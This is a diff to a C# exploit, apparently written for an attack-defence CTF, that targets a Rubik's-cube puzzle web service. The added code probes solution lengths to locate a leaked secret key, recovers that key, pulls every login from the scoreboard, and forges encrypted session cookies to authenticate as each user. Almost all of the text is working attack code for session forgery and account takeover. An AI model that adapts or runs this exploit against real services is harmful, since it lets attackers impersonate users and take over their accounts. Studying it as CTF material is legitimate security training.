@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net;
 using System.Net.Http;
@@ -15,8 +16,9 @@ namespace rubikxplt
 	{
 		private static readonly Version HttpVersion = new Version(1, 1);
 
-		private static readonly Uri BaseUri = new Uri("http://localhost:5071/");
+		private static Uri BaseUri = new Uri("http://localhost:5071/");
 
+		private static readonly Uri ApiScoreboard = new Uri(BaseUri, "/api/scoreboard");
 		private static readonly Uri ApiGenerate = new Uri(BaseUri, "/api/generate");
 		private static readonly Uri ApiSolve = new Uri(BaseUri, "/api/solve");
 		private static readonly Uri ApiAuth = new Uri(BaseUri, "/api/auth");
@@ -27,22 +29,17 @@ namespace rubikxplt
 		private static readonly string SafePrefix = "DDDDDDDDUUUUDDDDDdUUUUUUUUUUUUUUUU";
 
 		private static int SolutionLength;
-		private static string LoginToHack;
 
 		static async Task Main(string[] args)
 		{
-			if(args.Length < 2)
-			{
-				Console.WriteLine("xplt SolutionLength LoginToHack");
-				return;
-			}
-
-			SolutionLength = int.Parse(args[0]);
-			LoginToHack = args[1];
+			if(args.Length == 2 && int.TryParse(args[1], out var port))
+				BaseUri = new Uri($"http://{args[0]}:{port}/");
 
 			const int Up = 2; // Rotation UP
 			const int Down = 5; // Rotation DOWN
 			const int UNK = 0; // Unknown key byte to brute force
+
+			SolutionLength = await TryFindSolutionLength();
 
 			var puzzle = await GetHackedPuzzle();
 
@@ -99,11 +96,18 @@ namespace rubikxplt
 			Console.WriteLine($"KEY: {BitConverter.ToString(KEY)}");
 
 			Console.WriteLine($"Done! The key is '{new Guid(key)}', use it to encrypt forged cookie!");
-			var cookie = ForgeCookie(LoginToHack, KEY);
 
-			Console.WriteLine($"Forged cookie for '{LoginToHack}': '{cookie}'");
-			var auth = await Auth(cookie);
-			Console.WriteLine($"Auth: {auth}");
+			using var client = new HttpClient(new HttpClientHandler {ServerCertificateCustomValidationCallback = CertificateValidationCallback}) {DefaultRequestVersion = HttpVersion};
+			var scoreboard = JsonSerializer.Deserialize<List<Solution>>(await client.GetStringAsync(ApiScoreboard));
+
+			foreach(var sln in scoreboard)
+			{
+				var cookie = ForgeCookie(sln.Login, KEY);
+				Console.WriteLine($"Forged cookie for '{sln.Login}': '{cookie}'");
+
+				var auth = await Auth(cookie);
+				Console.WriteLine($"Auth: {auth}");
+			}
 		}
 
 		private static async Task<string> Auth(string cookie)
@@ -208,9 +212,11 @@ namespace rubikxplt
 
 		static async Task<string> GetHackedPuzzle()
 		{
+			Console.WriteLine("Generating exploitable puzzle");
 			using var client = new HttpClient(new HttpClientHandler {ServerCertificateCustomValidationCallback = CertificateValidationCallback}) {DefaultRequestVersion = HttpVersion};
 			for(int i = 0; i < 5000; i++)
 			{
+				if(i % 100 == 0) Console.WriteLine(i);
 				var value = await client.GenerateCube();
 				var puzzle = Convert.FromBase64String(value);
 				if(puzzle.Length != GeneratedCubeLength)
@@ -228,6 +234,36 @@ namespace rubikxplt
 			throw new Exception("Attempts limit exceeded");
 		}
 
+		//NOTE: offset of the key on the stack is OS and environment dependent, try to detect it
+		static async Task<int> TryFindSolutionLength()
+		{
+			int incr = 1, start = 0;
+			var puzzle = await GetHackedPuzzle();
+			for(int i = 360; i < 1000; i += incr)
+			{
+				Console.WriteLine("Try solution length: " + i);
+				var cookies = new CookieContainer();
+				using var client = new HttpClient(new HttpClientHandler {ServerCertificateCustomValidationCallback = CertificateValidationCallback, CookieContainer = cookies, UseCookies = true}) {DefaultRequestVersion = HttpVersion};
+				using var result = await client.PostAsync(ApiSolve + $"?login={WebUtility.UrlEncode(Login)}&pass={WebUtility.UrlEncode(Pass)}&puzzle={WebUtility.UrlEncode(puzzle)}&solution={new string('D', i)}", null);
+				if(result.StatusCode != HttpStatusCode.OK && result.StatusCode != (HttpStatusCode)409 && result.StatusCode != (HttpStatusCode)418)
+					throw new Exception($"/api/solve failed with HTTP {(int)result.StatusCode} -> {await result.Content.ReadAsStringAsync()}");
+
+				using var auth = await client.GetAsync(ApiAuth);
+				if(start == 0 && auth.StatusCode == HttpStatusCode.Unauthorized)
+				{
+					Console.WriteLine($"Auth failed at >= {i} solution length");
+					start = i;
+					incr = -1;
+					i += 100;
+					continue;
+				}
+
+				if(start > 0 && auth.StatusCode == HttpStatusCode.Unauthorized)
+					return i - 16 /* Key length */ - 3 /* Solution aligning */;
+			}
+			throw new Exception("Attempts limit exceeded");
+		}
+
 		static async Task<string> GenerateCube(this HttpClient client)
 			=> JsonSerializer.Deserialize<Generated>(await client.GetStringAsync(ApiGenerate)).Value;
 
@@ -241,5 +277,11 @@ namespace rubikxplt
 
 		[JsonPropertyName("value")]
 		public string Value { get; set; }
+	}
+
+	public class Solution
+	{
+		[JsonPropertyName("login")]
+		public string Login { get; set; }
 	}
 }
